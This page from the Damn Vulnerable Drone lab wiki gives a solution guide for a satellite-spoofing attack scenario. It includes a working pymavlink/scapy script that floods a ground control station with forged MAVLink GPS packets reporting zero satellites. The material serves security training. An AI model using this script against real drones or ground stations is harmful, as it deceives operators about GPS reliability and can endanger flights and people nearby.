<i>Spoofing the number of satellites visible to the drone to mislead the Ground Control Station (GCS) about the GPS signal quality.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Protocol Tampering > Satellite Spoofing

# Description

Satellite spoofing involves sending false information about the number of satellites visible to the drone to the Ground Control Station (GCS). This can mislead the GCS about the GPS signal quality and the overall reliability of the drone's positioning system.

# Resources

- <a href="https://mavlink.io/en/">MAVLink Protocol</a>  
- <a href="https://mavlink.io/en/mavgen_python/">PyMAVLink Documentation</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Setup</h3>
<pre><code class="code mb-3 mt-3">sudo apt-get update
sudo apt-get install python3 python3-pip
pip3 install pymavlink scapy
</code></pre>

---

<h3>Step 2. Create the Script</h3>
<p>Save the following as <code>satellite-spoofing.py</code>:</p>

<pre><code class="code mb-3 mt-3">from pymavlink import mavutil
from scapy.all import *
import time
import sys

def create_gps_raw_int(mav):
    gps_raw_int = mav.gps_raw_int_encode(
        time_usec=int(time.time() * 1e6),
        fix_type=1,  # No GPS fix
        lat=473566100,
        lon=854619300,
        alt=1500,
        eph=100,
        epv=100,
        vel=500,
        cog=0,
        satellites_visible=0
    )
    return gps_raw_int.pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python satellite-spoofing.py &lt;ip:port&gt;")
        sys.exit(1)

    target_ip, target_port = sys.argv[1].split(':')
    target_port = int(target_port)

    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1

    while True:
        gps_packet = create_gps_raw_int(mav)
        send_mavlink_packet(gps_packet, target_ip, target_port)
        print(f"Sent GPS spoofing packet with 0 satellites to {target_ip}:{target_port}")
</code></pre>

---

<h3>Step 3. Run the Script</h3>
<pre><code class="code mb-3 mt-3">sudo python3 satellite-spoofing.py 10.13.0.6:14550</code></pre>

<p>Replace with appropriate IP and port if needed:</p>
<ul>
  <li><code>10.13.0.6:14550</code> — QGroundControl</li>
  <li><code>192.168.13.14:14550</code> — MAVProxy over WiFi</li>
  <li><code>10.13.0.4:14550</code> — MAVProxy over bridge</li>
</ul>

---

<h3>Step 4. Monitor the Effects</h3>
<p>Watch the GCS display. The spoofed messages will show <strong>0 satellites visible</strong>, misleading the operator into thinking the drone has no GPS lock or weak GPS reliability.</p>

</details>
